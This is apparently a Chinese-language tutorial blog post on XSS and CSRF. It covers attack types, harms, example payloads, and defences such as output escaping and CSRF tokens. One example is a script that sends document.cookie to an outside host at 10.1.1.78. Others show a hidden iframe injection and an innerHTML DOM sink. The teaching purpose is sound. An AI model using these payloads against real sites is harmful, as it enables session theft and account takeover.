---
title: 关于XSS（跨站脚本攻击）和CSRF（跨站请求伪造）
tags: Network security
---

简述XSS原理并举例说明

<!--more-->

# XSS
XSS(Cross-site scripting)，跨站脚本攻击，是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript)，当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的。比如获取用户的Cookie，导航到恶意网站，携带木马等。

# 工作原理
恶意web用户将代码植入到提供给其它用户使用的页面中，如果程序没有经过过滤或者过滤敏感字符不严密就直接输出或者写入数据库。合法用户在访问这些页面的时候，程序将数据库里面的信息输出，这些恶意代码就会被执行。

# XSS漏洞的分类

1.本地利用漏洞，这种漏洞存在于页面中客户端脚本自身；
2.反射式漏洞，这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中；
3.存储式漏洞，该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。

# XSS攻击的危害

1.盗取用户cookie；
2.盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号；
3.控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力；
4.盗窃企业重要的具有商业价值的资料；
5.强制发送电子邮件；
6.网站挂马；

# XSS攻击举例

## 例子1——最简单的脚本插入（存储式跨站漏洞）

```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
</head>
<body>
<p><script>alert("OK")</script></p>
</body>
</html>
```

## 例子2——插入恶意网站（存储式跨站漏洞）

```
<iframe src="http://www.baidu.com" width="0" height="0" ></iframe>
```

## 例子3——窃取用户cookie（存储式跨站漏洞）

```
<script>document.write("<iframe width=0 height=0 src='http://10.1.1.78/cookie.asp?cookie="+document.cookie+"'></iframe>");</script>
```
虽然浏览器默认禁止了跨域访问，但并不禁止在页面中引用其他域的JS文件，并可以自由执行引入的JS文件中的function（包括操作cookie、Dom等等）。根据这一点，可以方便地通过创建script节点的方法来实现完全跨域的通信。

## 例子4——窃取用户cookie（基于网页DOM结构的攻击）

```html
<body>
<div id="t"></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick=test() />
<script>
function test(){
var str=document.getElementById("text").value;
document.getElementById("t").innerHTML="<a href='"+str+"''>test</a>";
}
</script>
</body>
```

# XSS防范——转义

用户输入总是不可信任的
- 对用户的输入信息转义，JS转义一般用于显示用户输入的时候
- 当动态生成的链接地址需要赋值给href或者src属性时，需要对这些地址进行URL转义。当然，如果服务端支持在URL中包含UTF-8的字符的话，其实不转义也不会错，这就是为什么我们平时不会太注意对表单和URL参数进行转义的原因，因为服务端表现良好。
- 似乎很多 Web 开发框架、模版引擎的开发者也发现了这一点，Django 内置模版和 Jinja2 模版总是默认转义输出变量的。如果使用了某款模版引擎，那么其必自带了方便快捷的转义方式。
- 在既要允许用户输入HTML，又要过滤其脚本的情况下，可以使用 Tidy 等 HTML 清理库，但要小心使用。对于复杂情况，可以使用简单方法处理——白名单重新整理

# CSRF
CSRF(Cross-site request forgery)，跨站请求伪造，是一种对网站的恶意利用，CSRF比XSS更具危险性。想要深入理解CSRF的攻击特性我们有必要了解一下网站session的工作原理。

# 防范——过滤请求的处理者

1、改良API设计，对于发布这一类创建资源的操作只接受POST请求，而GET请求应该只浏览而不改变服务器端资源。
2、请求令牌，首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。
使用请求令牌注意：
- 虽然请求令牌原理和验证码有相似之处，但不应该像验证码一样，全局使用一个 Session Key。因为请求令牌的方法在理论上是可破解的，破解方式是解析来源页面的文本，获取令牌内容。
- 在 ajax 技术应用较多的场合，因为很有请求是 JavaScript 发起的，使用静态的模版输出令牌值或多或少有些不方便。但无论如何，请不要提供直接获取令牌值的 API。这么做无疑是锁上了大门，却又把钥匙放在门口，让我们的请求令牌退化为同步令牌。

